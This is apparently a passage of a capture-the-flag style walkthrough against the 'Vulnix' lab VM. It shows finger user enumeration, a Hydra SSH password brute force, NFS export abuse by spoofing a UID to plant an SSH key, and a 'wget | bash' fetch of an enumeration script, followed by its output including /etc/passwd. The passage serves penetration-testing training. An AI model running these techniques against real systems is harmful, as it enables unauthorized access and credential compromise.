mail. No Plan. root@kali:~/Documents/vulnix# nc 192.168.88.134 79 vulnix Login: vulnix Name: Directory: /home/vulnix Shell: /bin/bash Never logged in. No mail. No Plan.  msf5 \u0026gt; search finger Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/mybb_db_fingerprint 2014-02-13 normal Yes MyBB Database Fingerprint 1 auxiliary/scanner/finger/finger_users normal No Finger Service User Enumerator 2 auxiliary/scanner/oracle/isqlplus_login normal No Oracle iSQL*Plus Login Utility 3 auxiliary/scanner/oracle/isqlplus_sidbrute normal No Oracle iSQLPlus SID Check 4 auxiliary/scanner/vmware/esx_fingerprint normal No VMWare ESX/ESXi Fingerprint Scanner 5 auxiliary/server/browser_autopwn normal No HTTP Client Automatic Exploiter 6 exploit/bsd/finger/morris_fingerd_bof 1988-11-02 normal Yes Morris Worm fingerd Stack Buffer Overflow 7 exploit/windows/http/bea_weblogic_post_bof 2008-07-17 great Yes Oracle Weblogic Apache Connector POST Request Buffer Overflow 8 exploit/windows/rdp/cve_2019_0708_bluekeep_rce 2019-05-14 manual Yes CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free 9 post/windows/gather/enum_putty_saved_sessions normal No PuTTY Saved Sessions Enumeration Module msf5 \u0026gt; use 1 msf5 auxiliary(scanner/finger/finger_users) \u0026gt; show options Module options (auxiliary/scanner/finger/finger_users): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 79 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) USERS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of default UNIX accounts. msf5 auxiliary(scanner/finger/finger_users) \u0026gt; set rhost 192.168.88.134 rhost =\u0026gt; 192.168.88.134 msf5 auxiliary(scanner/finger/finger_users) \u0026gt; run [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: backup [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: bin [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: daemon [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: games [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: gnats [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: irc [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: libuuid [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: list [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: lp [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: mail [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: dovecot [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: man [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: messagebus [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: news [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: nobody [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: proxy [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: root [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: sshd [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: sync [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: sys [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: syslog [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: user [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: dovenull [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: uucp [+] 192.168.88.134:79 - 192.168.88.134:79 - Found user: www-data [+] 192.168.88.134:79 - 192.168.88.134:79 Users found: backup, bin, daemon, dovecot, dovenull, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, syslog, user, uucp, www-data [*] 192.168.88.134:79 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  user list backup bin daemon dovecot dovenull games gnats irc libuuid list lp mail man messagebus news nobody proxy root sshd sync sys syslog user uucp www-data vulnix  nfs showmount -e 192.168.88.134 Export list for 192.168.88.134: /home/vulnix *  Breaking in Hydra hydra -L /root/Documents/vulnix/users.txt -P /usr/share/wordlists/rockyou.txt 192.168.88.134 ssh -t 8 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-05 18:22:01 [DATA] max 8 tasks per 1 server, overall 8 tasks, 28688798 login tries (l:2/p:14344399), ~3586100 tries per task [DATA] attacking ssh://192.168.88.134:22/ [STATUS] 88.00 tries/min, 88 tries in 00:01h, 28688710 to do in 5433:29h, 8 active [STATUS] 66.67 tries/min, 200 tries in 00:03h, 28688598 to do in 7172:09h, 8 active [STATUS] 58.29 tries/min, 408 tries in 00:07h, 28688390 to do in 8203:23h, 8 active [22][ssh] host: 192.168.88.134 login: user password: letmein  user:letmein\nnfs mount root@kali:~/Documents/vulnix# mount -nolock -t nfs 192.168.88.134:/home/vulnix /root/Documents/vulnix/mountme/ root@kali:~/Documents/vulnix# ls -la total 150708 drwxr-xr-x 3 root root 4096 Jan 5 18:27 . drwxr-xr-x 5 root root 4096 Jan 5 16:35 .. drwxr-x--- 2 nobody 4294967294 4096 Sep 2 2012 mountme -rw-r--r-- 1 root root 1022 Jan 5 16:42 tcp.gnmap -rw-r--r-- 1 root root 3504 Jan 5 16:42 tcp.nmap -rw-r--r-- 1 root root 15356 Jan 5 16:42 tcp.xml -rw-r--r-- 1 root root 0 Jan 5 17:01 udp.gnmap -rw-r--r-- 1 root root 0 Jan 5 17:01 udp.nmap -rw-r--r-- 1 root root 5345 Jan 5 17:01 udp.xml -rw-r--r-- 1 root root 12 Jan 5 18:21 users.txt root@kali:~/Documents/vulnix# umount mountme root@kali:~/Documents/vulnix# ls -la total 150708 drwxr-xr-x 3 root root 4096 Jan 5 18:27 . drwxr-xr-x 5 root root 4096 Jan 5 16:35 .. -rw-r--r-- 1 root root 154273377 Jan 5 18:32 hydra.restore drwxr-x--- 2 2008 2008 4096 Sep 2 2012 mountme -rw-r--r-- 1 root root 1022 Jan 5 16:42 tcp.gnmap -rw-r--r-- 1 root root 3504 Jan 5 16:42 tcp.nmap -rw-r--r-- 1 root root 15356 Jan 5 16:42 tcp.xml -rw-r--r-- 1 root root 0 Jan 5 17:01 udp.gnmap -rw-r--r-- 1 root root 0 Jan 5 17:01 udp.nmap -rw-r--r-- 1 root root 5345 Jan 5 17:01 udp.xml -rw-r--r-- 1 root root 12 Jan 5 18:21 users.txt root@kali:~/Documents/vulnix# useradd vulnix -u 2008 -d /home/vulnix root@kali:~/Documents/vulnix# ls -lA total 40 drwxr-x--- 2 vulnix vulnix 4096 Sep 2 2012 mountme -rw-r--r-- 1 root root 1022 Jan 5 16:42 tcp.gnmap -rw-r--r-- 1 root root 3504 Jan 5 16:42 tcp.nmap -rw-r--r-- 1 root root 15356 Jan 5 16:42 tcp.xml -rw-r--r-- 1 root root 0 Jan 5 17:01 udp.gnmap -rw-r--r-- 1 root root 0 Jan 5 17:01 udp.nmap -rw-r--r-- 1 root root 5345 Jan 5 17:01 udp.xml -rw-r--r-- 1 root root 12 Jan 5 18:21 users.txt root@kali:~/Documents/vulnix# su vulnix $ bash vulnix@kali:/root/Documents/vulnix/mountme$ ls -lA total 12 -rw-r--r-- 1 vulnix vulnix 220 Apr 3 2012 .bash_logout -rw-r--r-- 1 vulnix vulnix 3486 Apr 3 2012 .bashrc -rw-r--r-- 1 vulnix vulnix 675 Apr 3 2012 .profile vulnix@kali:/root/Documents/vulnix/mountme$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): /tmp/key Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /tmp/key. Your public key has been saved in /tmp/key.pub. The key fingerprint is: SHA256:ES3pMjF0F3d/CzJhJIqQc/3J9G5ot+kBuyh9krD7alQ vulnix@kali The keys randomart image is: +---[RSA 3072]----+ | ...o o++=. . | | o..+o+++... . | | o. ==.oo . o| | oE.= .o . o| | .oS.o . | | o oo+ | | . + o.o.o | | + +...o. | | .o=oo... | +----[SHA256]-----+ vulnix@kali:/root/Documents/vulnix/mountme$ mv /tmp/key.pub . vulnix@kali:/root/Documents/vulnix/mountme$ mkdir .ssh vulnix@kali:/root/Documents/vulnix/mountme$ vim .ssh/authorized_keys vulnix@kali:/root/Documents/vulnix/mountme$ touch .ssh/authorized_keys vulnix@kali:/root/Documents/vulnix/mountme$ cat key.pub \u0026gt;\u0026gt; .ssh/authorized_keys vulnix@kali:/root/Documents/vulnix/mountme$ cat .ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHQQAHSTFt/pSBit7lLH9HvkC9t0eSOyZLm61y//Y4CJrIMQVSWDj6OtqdN/HqtoYZbDw0hahkR9Ynkf0O2y3jT09l1pVdL0R1nJoT5xe0k6fXmJc5+d10y8SdJTc9yop5MKLm4vd3XDYVMxjAnRr59nFqj7HoQJI/SHvriLLplHJrznBgTok/YSnP8+kpAbtd3bpjO2zWvQDc2XoQOCuqUDx21Yy4kiP400dWpzXTE8gQsrd0T5i7DhEZd1R7Z0fCuhTY3d7VyB7AGesyxpynsVqrzDoxoWcPLQkKeov4Cov6FB5OnzKboFHxBWVHp4W6AKzmkvtbL0gCZOou5ytR/PcIDBDZPBR0UjoZdzYeUIWfRrAQMEa+LnLAcIzGZVvLIjjx2noW/F/KmVg24GP8VOn1ixXcRRqd/32hgcVUlQbzNJSIHPboF3c5n2xqMmPtLRk3Gi6qRXdm2yobkg0HQ5xhNMgsUiA0nCfTZKajWfQ4BvL5Y9oi2EHumTzMgzM= vulnix@kali vulnix@kali:/root/Documents/vulnix/mountme$ ssh vulnix@192.168.88.134 -i /tmp/key Could not create directory '/home/vulnix/.ssh'. The authenticity of host '192.168.88.134 (192.168.88.134)' cant be established. ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Failed to add the host to the list of known hosts (/home/vulnix/.ssh/known_hosts). Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686) * Documentation: https://help.ubuntu.com/ System information as of Sun Jan 5 17:43:36 GMT 2020 System load: 0.0 Processes: 96 Usage of /: 90.6% of 773MB Users logged in: 0 Memory usage: 4% IP address for eth0: 192.168.88.134 Swap usage: 0% =\u0026gt; / is using 90.6% of 773MB Graph this data and manage this system at https://landscape.canonical.com/ New release '14.04.6 LTS' available. Run 'do-release-upgrade' to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. vulnix@vulnix:/$  LinEnum vulnix@vulnix:/$ wget -O - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash --2020-01-05 17:45:25-- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.36.133 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.36.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/plain] Saving to: STDOUT 100%[===============================================================================================================================================\u0026gt;] 46,476 --.-K/s in 0.008s 2020-01-05 17:45:25 (5.86 MB/s) - written to stdout [46476/46476] ##################################################################################### # Local Linux Enumeration \u0026amp; Privilege Escalation Script # ##################################################################################### # www.rebootuser.com # version 0.981 [-] Debug Info [+] Thorough tests = Disabled Scan started at: Sun Jan 5 17:45:27 GMT 2020 #### SYSTEM ##################################################################### [-] Kernel information: Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux [-] Kernel information (continued): Linux version 3.2.0-29-generic-pae (buildd@roseapple) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 [-] Specific release information: DISTRIB_ID=Ubuntu DISTRIB_RELEASE=12.04 DISTRIB_CODENAME=precise DISTRIB_DESCRIPTION=\u0026quot;Ubuntu 12.04.1 LTS\u0026quot; [-] Hostname: vulnix #### USER/GROUP ############################################################### [-] Current user/group info: uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix) [-] Users that have previously logged onto the system: Username Port From Latest vulnix pts/0 192.168.88.128 Sun Jan 5 17:43:36 +0000 2020 [-] Who else is logged on: 17:45:28 up 2:11, 1 user, load average: 0.00, 0.01, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT vulnix pts/0 192.168.88.128 17:43 3.00s 0.73s 0.01s w [-] Group memberships: uid=0(root) gid=0(root) groups=0(root) uid=1(daemon) gid=1(daemon) groups=1(daemon) uid=2(bin) gid=2(bin) groups=2(bin) uid=3(sys) gid=3(sys) groups=3(sys) uid=4(sync) gid=65534(nogroup) groups=65534(nogroup) uid=5(games) gid=60(games) groups=60(games) uid=6(man) gid=12(man) groups=12(man) uid=7(lp) gid=7(lp) groups=7(lp) uid=8(mail) gid=8(mail) groups=8(mail) uid=9(news) gid=9(news) groups=9(news) uid=10(uucp) gid=10(uucp) groups=10(uucp) uid=13(proxy) gid=13(proxy) groups=13(proxy) uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=34(backup) gid=34(backup) groups=34(backup) uid=38(list) gid=38(list) groups=38(list) uid=39(irc) gid=39(irc) groups=39(irc) uid=41(gnats) gid=41(gnats) groups=41(gnats) uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) uid=100(libuuid) gid=101(libuuid) groups=101(libuuid) uid=101(syslog) gid=103(syslog) groups=103(syslog) uid=102(messagebus) gid=105(messagebus) groups=105(messagebus) uid=103(whoopsie) gid=106(whoopsie) groups=106(whoopsie) uid=104(postfix) gid=110(postfix) groups=110(postfix) uid=105(dovecot) gid=112(dovecot) groups=112(dovecot) uid=106(dovenull) gid=65534(nogroup) groups=65534(nogroup) uid=107(landscape) gid=113(landscape) groups=113(landscape) uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup) uid=1000(user) gid=1000(user) groups=1000(user),100(users) uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix) uid=109(statd) gid=65534(nogroup) groups=65534(nogroup) [-] Contents of /etc/passwd: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:105::/var/run/dbus:/bin/false whoopsie:x:103:106::/nonexistent:/bin/false postfix:x:104:110::/var/spool/postfix:/bin/false dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false landscape:x:107:113::/var/lib/landscape:/bin/false sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin user:x:1000:1000:user,,,:/home/user:/bin/bash vulnix:x:2008:2008::/home/vulnix:/bin/bash statd:x:109:65534::/var/lib/nfs:/bin/false [-] Super user account(s): root [+] We can sudo without supplying a password! Matching 'Defaults' entries for vulnix on this host: env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User vulnix may run the following commands on this host: (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports [-] Are permissions on /home directories lax: total 16K drwxr-xr-x 4 root root 4.0K Sep 2 2012 . drwxr-xr-x 22 root root 4.0K Sep 2 2012 .. drwxr-x--- 3 user user 4.0K Sep 2 2012 user drwxr-x--- 4 vulnix vulnix 4.0K Jan 5 17:43 vulnix [-] Root is allowed to login via SSH: PermitRootLogin yes #### ENVIRONMENTAL ########################################################## [-] Environment information: SHELL=/bin/bash TERM=screen SSH_CLIENT=192.168.88.128 43142 22 SSH_TTY=/dev/pts/0 USER=vulnix PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games MAIL=/var/mail/vulnix PWD=/ LANG=en_GB.UTF-8 HOME=/home/vulnix SHLVL=2 LANGUAGE=en_GB:en LOGNAME=vulnix SSH_CONNECTION=192.168.88.128 43142 192.168.88.134 22 LESSOPEN=| /usr/bin/lesspipe %s LESSCLOSE=/usr/bin/lesspipe %s %s _=/usr/bin/env [-] Path information: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games drwxr-xr-x 2 root root 4096 Sep 2 2012 /bin drwxr-xr-x 2 root root 4096 Sep 2 2012 /sbin drwxr-xr-x 2 root root 20480 Sep 2 2012 /usr/bin drwxr-xr-x 2 root root 4096 Aug 4 2012 /usr/games drwxr-xr-x 2 root root 4096 Sep 2 2012 /usr/local/bin drwxr-xr-x 2 root root 4096 Sep 2 2012 /usr/local/sbin drwxr-xr-x 2 root root 4096 Sep 2 2012 /usr/sbin [-] Available shells: # /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash /usr/bin/tmux /usr/bin/screen [-] Current umask value: 0002 u=rwx,g=rwx,o=rx [-] umask value as specified in /etc/login.defs: UMASK 022 [-] Password and storage information: PASS_MAX_DAYS 99999 PASS_MIN_DAYS 0 PASS_WARN_AGE 7 ENCRYPT_METHOD SHA512 #### JOBS/TASKS ############################################################### [-] Cron jobs: -rw-r--r-- 1 root root 722 Jun 19 2012 /etc/crontab /etc/cron.d: total 12 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. -rw-r--r-- 1 root root 102 Jun 19 2012 .placeholder /etc/cron.daily: total 72 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. -rwxr-xr-x 1 root root 219 Apr 10 2012 apport -rwxr-xr-x 1 root root 15399 Jun 15 2012 apt -rwxr-xr-x 1 root root 314 Mar 30 2012 aptitude -rwxr-xr-x 1 root root 502 Mar 31 2012 bsdmainutils -rwxr-xr-x 1 root root 256 Apr 13 2012 dpkg -rwxr-xr-x 1 root root 372 Oct 4 2011 logrotate -rwxr-xr-x 1 root root 1365 Mar 31 2012 man-db -rwxr-xr-x 1 root root 606 Aug 17 2011 mlocate -rwxr-xr-x 1 root root 249 Apr 9 2012 passwd -rw-r--r-- 1 root root 102 Jun 19 2012 .placeholder -rwxr-xr-x 1 root root 2417 Jul 1 2011 popularity-contest -rwxr-xr-x 1 root root 2947 Jun 19 2012 standard -rwxr-xr-x 1 root root 214 Aug 9 2012 update-notifier-common /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. -rw-r--r-- 1 root root 102 Jun 19 2012 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. -rw-r--r-- 1 root root 102 Jun 19 2012 .placeholder /etc/cron.weekly: total 20 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. -rwxr-xr-x 1 root root 730 Dec 31 2011 apt-xapian-index -rwxr-xr-x 1 root root 907 Mar 31 2012 man-db -rw-r--r-- 1 root root 102 Jun 19 2012 .placeholder [-] Crontab contents: # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # #### NETWORKING ############################################################### [-] Network and IP info: eth0 Link encap:Ethernet HWaddr 00:0c:29:76:09:06 inet addr:192.168.88.134 Bcast:192.168.88.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe76:906/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:237784 errors:0 dropped:0 overruns:0 frame:0 TX packets:214428 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:23188391 (23.1 MB) TX bytes:23105913 (23.1 MB) Interrupt:18 Base address:0x2000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:4 errors:0 dropped:0 overruns:0 frame:0 TX packets:4 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:260 (260.0 B) TX bytes:260 (260.0 B) [-] ARP history: ? (192.168.88.254) at 00:50:56:f7:8f:d0 [ether] on eth0 ? (192.168.88.2) at 00:50:56:fe:4e:c1 [ether] on eth0 ? (192.168.88.128) at 00:0c:29:2c:0f:aa [ether] on eth0 [-] Nameserver(s): nameserver 192.168.88.2 [-] Default route: default 192.168.88.2 0.0.0.0 UG 100 0 0 eth0 [-] Listening TCP: Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:110 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:143 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:79 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:38839 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:54775 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:57722 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:512 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:993 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:513 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:514 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:995 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:59621 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:38568 0.0.0.0:* LISTEN - tcp6 0 0 :::110 :::* LISTEN - tcp6 0 0 :::143 :::* LISTEN - tcp6 0 0 :::111 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::25 :::* LISTEN - tcp6 0 0 :::56089 :::* LISTEN - tcp6 0 0 :::51233 :::* LISTEN - tcp6 0 0 :::2049 :::* LISTEN - tcp6 0 0 :::993 :::* LISTEN - tcp6 0 0 :::57281 :::* LISTEN - tcp6 0 0 :::37539 :::* LISTEN - tcp6 0 0 :::995 :::* LISTEN - tcp6 0 0 :::49831 :::* LISTEN - [-] Listening UDP: Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:50138 0.0.0.0:* - udp 0 0 127.0.0.1:987 0.0.0.0:* - udp 0 0 0.0.0.0:40412 0.0.0.0:* - udp 0 0 0.0.0.0:2049 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp 0 0 0.0.0.0:40033 0.0.0.0:* - udp 0 0 0.0.0.0:111 0.0.0.0:* - udp 0 0 0.0.0.0:39546 0.0.0.0:* - udp 0 0 0.0.0.0:42654 0.0.0.0:* - udp 0 0 0.0.0.0:857 0.0.0.0:* - udp6 0 0 :::54698 :::* - udp6 0 0 :::53717 :::* - udp6 0 0 :::49656 :::* - udp6 0 0 :::2049 :::* - udp6 0 0 :::111 :::* - udp6 0 0 :::59004 :::* - udp6 0 0 :::42201 :::* - udp6 0 0 :::857 :::* - #### SERVICES ################################################################### [-] Running processes: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.1 3512 1920 ? Ss 15:33 0:01 /sbin/init root 2 0.0 0.0 0 0 ? S 15:33 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S 15:33 0:00 [ksoftirqd/0] root 6 0.0 0.0 0 0 ? S 15:33 0:00 [migration/0] root 7 0.0 0.0 0 0 ? S 15:33 0:00 [watchdog/0] root 8 0.0 0.0 0 0 ? S 15:33 0:00 [migration/1] root 10 0.0 0.0 0 0 ? S 15:33 0:00 [ksoftirqd/1] root 11 0.0 0.0 0 0 ? S 15:33 0:01 [kworker/0:1] root 12 0.0 0.0 0 0 ? S 15:33 0:00 [watchdog/1] root 13 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [cpuset] root 14 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [khelper] root 15 0.0 0.0 0 0 ? S 15:33 0:00 [kdevtmpfs] root 16 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [netns] root 18 0.0 0.0 0 0 ? S 15:33 0:00 [sync_supers] root 19 0.0 0.0 0 0 ? S 15:33 0:00 [bdi-default] root 20 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [kintegrityd] root 21 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [kblockd] root 22 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [ata_sff] root 23 0.0 0.0 0 0 ? S 15:33 0:00 [khubd] root 24 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [md] root 26 0.0 0.0 0 0 ? S 15:33 0:00 [khungtaskd] root 27 0.0 0.0 0 0 ? S 15:33 0:00 [kswapd0] root 28 0.0 0.0 0 0 ? SN 15:33 0:00 [ksmd] root 29 0.0 0.0 0 0 ? SN 15:33 0:00 [khugepaged] root 30 0.0 0.0 0 0 ? S 15:33 0:00 [fsnotify_mark] root 31 0.0 0.0 0 0 ? S 15:33 0:00 [ecryptfs-kthrea] root 32 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [crypto] root 40 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [kthrotld] root 41 0.0 0.0 0 0 ? S 15:33 0:00 [scsi_eh_0] root 42 0.0 0.0 0 0 ? S 15:33 0:00 [scsi_eh_1] root 63 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [devfreq_wq] root 64 0.0 0.0 0 0 ? S 15:33 0:00 [kworker/1:1] root 103 0.0 0.0 0 0 ? S 15:33 0:00 [kworker/1:2] root 217 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [mpt_poll_0] root 218 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [mpt/0] root 241 0.0 0.0 0 0 ? S 15:33 0:00 [scsi_eh_2] root 253 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [kdmflush] root 265 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [kdmflush] root 274 0.0 0.0 0 0 ? S 15:33 0:00 [jbd2/dm-0-8] root 275 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [ext4-dio-unwrit] root 470 0.0 0.0 2816 612 ? S 15:33 0:00 upstart-udev-bridge --daemon root 474 0.0 0.1 3044 1244 ? Ss 15:33 0:00 /sbin/udevd --daemon root 558 0.0 0.0 3000 776 ? S 15:33 0:00 /sbin/udevd --daemon root 559 0.0 0.0 3008 772 ? S 15:33 0:00 /sbin/udevd --daemon root 592 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [kpsmoused] root 693 0.0 0.0 2828 348 ? S 15:33 0:00 upstart-socket-bridge --daemon root 704 0.0 0.0 2680 1008 ? Ss 15:33 0:00 rpcbind -w root 770 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [rpciod] root 788 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [nfsiod] 102 803 0.0 0.0 3240 880 ? Ss 15:33 0:00 dbus-daemon --system --fork --activation=upstart root 804 0.0 0.0 2892 860 ? Ss 15:33 0:00 rpc.idmapd syslog 808 0.0 0.1 31044 1400 ? Sl 15:33 0:03 rsyslogd -c5 statd 811 0.0 0.1 2984 1360 ? Ss 15:33 0:00 rpc.statd -L root 854 0.0 0.0 2908 808 ? Ss 15:33 0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -1 eth0 root 876 0.0 0.2 6664 2412 ? Ss 15:33 0:01 /usr/sbin/sshd -D root 957 0.0 0.0 4612 836 